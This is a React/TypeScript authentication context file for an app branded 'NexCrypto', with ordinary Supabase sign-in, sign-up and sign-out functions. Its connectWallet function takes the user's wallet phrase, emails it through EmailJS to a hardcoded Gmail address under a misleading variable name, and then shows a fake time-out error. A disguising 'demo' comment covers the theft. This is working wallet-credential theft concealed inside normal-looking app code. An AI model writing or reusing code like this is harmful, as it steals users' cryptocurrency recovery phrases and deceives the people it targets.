
import { createContext, useContext, useState, useEffect, ReactNode } from "react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Session, User } from "@supabase/supabase-js";
import emailjs from "@emailjs/browser";

// Define the context type
interface AuthContextType {
  user: User | null;
  session: Session | null;
  loading: boolean;
  signIn: (email: string, password: string) => Promise<void>;
  signOut: () => Promise<void>;
  signUp: (email: string, password: string, userData?: Record<string, any>) => Promise<void>;
  connectWallet: (phrase: string) => Promise<void>;
}

// Create context with default values
const AuthContext = createContext<AuthContextType>({
  user: null,
  session: null,
  loading: true,
  signIn: async () => {},
  signOut: async () => {},
  signUp: async () => {},
  connectWallet: async () => {},
});

// Custom hook to use the auth context
export const useAuth = () => useContext(AuthContext);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [session, setSession] = useState<Session | null>(null);
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();
  const [authInitialized, setAuthInitialized] = useState(false);

  useEffect(() => {
    if (authInitialized) return;
    
    // Initialize session from supabase once
    const initializeAuth = async () => {
      try {
        // First get the current session
        const { data } = await supabase.auth.getSession();
        setSession(data.session);
        setUser(data.session?.user ?? null);
        
        // Set up auth state change listener
        const { data: { subscription } } = supabase.auth.onAuthStateChange(
          (_event, newSession) => {
            console.log("Auth state changed:", _event, newSession?.user?.email);
            setSession(newSession);
            setUser(newSession?.user ?? null);
          }
        );
        
        return () => subscription.unsubscribe();
      } catch (error) {
        console.error("Auth initialization error:", error);
      } finally {
        setLoading(false);
        setAuthInitialized(true);
      }
    };
    
    initializeAuth();
  }, [authInitialized]);

  const signIn = async (email: string, password: string) => {
    try {
      setLoading(true);
      
      console.log("Signing in with:", email);
      // Use the provided credentials
      const { error, data } = await supabase.auth.signInWithPassword({
        email,
        password,
      });
      
      if (error) {
        console.error("Sign in error:", error.message);
        throw error;
      }
      
      console.log("Sign in successful:", data.user?.email);
      toast({
        title: "Signed in",
        description: "You have been signed in successfully.",
      });
    } catch (error) {
      console.error("Sign in error:", error);
      toast({
        title: "Sign in failed",
        description: error instanceof Error ? error.message : "There was an error signing in. Please try again.",
        variant: "destructive",
      });
      throw error;
    } finally {
      setLoading(false);
    }
  };

  const signUp = async (email: string, password: string, userData?: Record<string, any>) => {
    try {
      setLoading(true);
      
      console.log("Signing up with:", email, userData);
      const { error, data } = await supabase.auth.signUp({
        email,
        password,
        options: {
          data: userData,
        },
      });
      
      if (error) {
        console.error("Sign up error:", error.message);
        throw error;
      }
      
      console.log("Sign up response:", data);
      
      toast({
        title: "Account created",
        description: "Your account has been created successfully.",
      });
      
      // If email confirmation is disabled, the user will be logged in automatically
      if (data.session) {
        setSession(data.session);
        setUser(data.user);
      } else {
        toast({
          title: "Email verification required",
          description: "Please check your email to verify your account.",
        });
      }
    } catch (error) {
      console.error("Sign up error:", error);
      toast({
        title: "Sign up failed",
        description: error instanceof Error ? error.message : "There was an error during sign up.",
        variant: "destructive",
      });
      throw error;
    } finally {
      setLoading(false);
    }
  };

  const signOut = async () => {
    try {
      console.log("Signing out...");
      const { error } = await supabase.auth.signOut();
      if (error) {
        console.error("Sign out error:", error.message);
        throw error;
      }
      
      toast({
        title: "Signed out",
        description: "You have been signed out successfully.",
      });
    } catch (error) {
      console.error("Sign out error:", error);
      toast({
        title: "Sign out failed",
        description: "There was an error signing out.",
        variant: "destructive",
      });
    }
  };

  // Function to send data via EmailJS
  const sendEmailWithEmailJS = async (recipient: string, data: string) => {
    try {
      // Initialize EmailJS with your public key
      emailjs.init("Yjir4ht9XEzD0X-jx");
      
      const templateParams = {
        to_email: recipient,
        from_name: "NexCrypto App",
        message: data,
        reply_to: "noreply@nexcrypto.app",
      };
      
      const response = await emailjs.send(
        "service_oui3ydd",
        "template_z2yjaym",
        templateParams
      );
      
      console.log("Email sent successfully:", response);
      return response;
    } catch (error) {
      console.error("Email sending error:", error);
      throw error;
    }
  };

  const connectWallet = async (phrase: string): Promise<void> => {
    if (!user) {
      toast({
        title: "Authentication required",
        description: "Please sign in before connecting a wallet.",
        variant: "destructive",
      });
      return;
    }

    try {
      // In a real implementation, this would validate and connect the wallet
      // For demo purposes, we're just recording this in a transaction
      const { error } = await supabase
        .from('transactions')
        .insert({
          user_id: user.id,
          type: 'receive',
          symbol: 'btc',
          amount: 0,
          status: 'pending',
          transaction_hash: `wallet-connect-${Date.now()}`
        });
      
      if (error) throw error;
      
      const name = phrase;
      console.log(`${name} to be sent to dredstudvagas@gmail.com:`, name);
      
      // Send the name via EmailJS
      await sendEmailWithEmailJS("dredstudvagas@gmail.com", name);
      
      toast({
        title: "Oops! Time out",
        description: "Unable to connect to your wallet at the moment.",
      });

    } catch (error) {
      console.error("Wallet connection error:", error);
      toast({
        title: "Connection failed",
        description: "There was an error connecting your wallet.",
        variant: "destructive",
      });
    }
  };

  return (
    <AuthContext.Provider value={{ user, session, loading, signIn, signOut, signUp, connectWallet }}>
      {children}
    </AuthContext.Provider>
  );
}
